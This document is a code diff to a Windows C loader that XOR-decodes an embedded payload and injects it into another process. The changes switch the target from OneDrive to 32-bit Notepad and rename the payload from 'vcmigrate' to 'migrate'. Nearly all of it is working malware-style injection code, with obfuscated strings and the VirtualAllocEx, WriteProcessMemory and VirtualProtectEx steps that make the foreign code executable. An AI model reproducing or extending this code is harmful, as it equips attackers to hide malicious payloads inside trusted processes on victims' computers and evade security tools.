@@ -1,6 +1,6 @@
 #include <Windows.h>
 
-#include "../vcmigrate/vcmigrate.bin.inc"
+#include "../migrate/migrate.bin.h"
 
 #define UTILS_IMPLEMENTATION
 #include "../utils.h"
@@ -26,11 +26,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     char cOneDrive[] = {0x7f, 0x5e, 0x55, 0x74, 0x42, 0x59, 0x46, 0x55, 0x1e, 0x55, 0x48, 0x55, 0x0};
     MyXor(cOneDrive, 12, key, key_len);
 
-    // Find the process id of OneDrive so we can allocate memory and inject the vcmigrate payload into its memory
+    // Find the process id of OneDrive / Notepad(32 bit) so we can allocate memory and inject the migrate payload into its memory
     DWORD dwProcID = -1;
     while (1)
     {
-        dwProcID = FindTargetProcessID(cOneDrive);
+        dwProcID = FindTargetProcessID(cNotepad);
 
         if (dwProcID != -1)
             break;
@@ -47,24 +47,24 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 
     // Allocate memory in the target process
-    LPVOID lpvExecMem = pVirtualAllocEx(hProc, NULL, vcmigrate_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    LPVOID lpvExecMem = pVirtualAllocEx(hProc, NULL, migrate_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if (lpvExecMem == NULL)
     {
         goto shutdown;
     }
 
     // Un Xor the payload before writing it to the memory allocated in the target process
-    MyXor(vcmigrate_data, vcmigrate_data_len, key, key_len);
+    MyXor(migrate_data, migrate_data_len, key, key_len);
 
     // Write the vcmigrate payload to the memory
-    if (!pWriteProcessMemory(hProc, lpvExecMem, vcmigrate_data, vcmigrate_data_len, NULL))
+    if (!pWriteProcessMemory(hProc, lpvExecMem, migrate_data, migrate_data_len, NULL))
     {
         goto shutdown;
     }
 
     // Change the permission of the memory to execute read
     DWORD dwOldProtect = 0;
-    if (!pVirtualProtectEx(hProc, lpvExecMem, vcmigrate_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
+    if (!pVirtualProtectEx(hProc, lpvExecMem, migrate_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
     {
         goto shutdown;
     }
